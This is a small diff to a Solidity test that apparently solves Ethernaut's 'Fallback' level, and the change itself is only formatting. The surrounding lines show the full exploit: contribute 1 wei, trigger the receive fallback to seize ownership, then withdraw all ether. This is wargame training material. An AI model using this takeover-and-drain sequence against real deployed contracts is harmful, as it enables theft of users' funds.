@@ -16,7 +16,7 @@ contract Level1Test is EthernautTest {
         // Contribute minimum amount of ether to ensure fallback passes
         levelInstance1.contribute{value: 1 wei}();
         // Send ether to receive fallback to gain ownership of contract
-        (bool success, ) = address(levelInstance1).call{value: 1 wei}("");
+        (bool success,) = address(levelInstance1).call{value: 1 wei}("");
         // Withdraw all ether from contract
         levelInstance1.withdraw();
 
